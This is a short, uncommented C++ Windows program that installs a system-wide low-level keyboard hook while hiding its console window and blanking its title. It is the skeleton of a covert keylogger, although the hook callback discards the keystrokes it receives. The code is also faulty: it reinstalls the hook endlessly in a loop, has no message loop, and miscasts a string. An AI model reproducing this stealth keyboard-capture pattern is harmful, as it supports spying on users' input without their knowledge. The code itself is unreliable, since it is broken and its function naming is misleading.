
#include <iostream>
#include <windows.h>
HHOOK hHook;
LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		KBDLLHOOKSTRUCT*pKB = (KBDLLHOOKSTRUCT*)lParam;
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}
void gdiscreen()
{
	while (true)
	{
		hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyHookProc, 0, 0);
		Sleep(100);
	}
}



int main()
{

	SetWindowText(GetConsoleWindow(), (LPCWSTR)"");
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	gdiscreen();
	return 0;
}
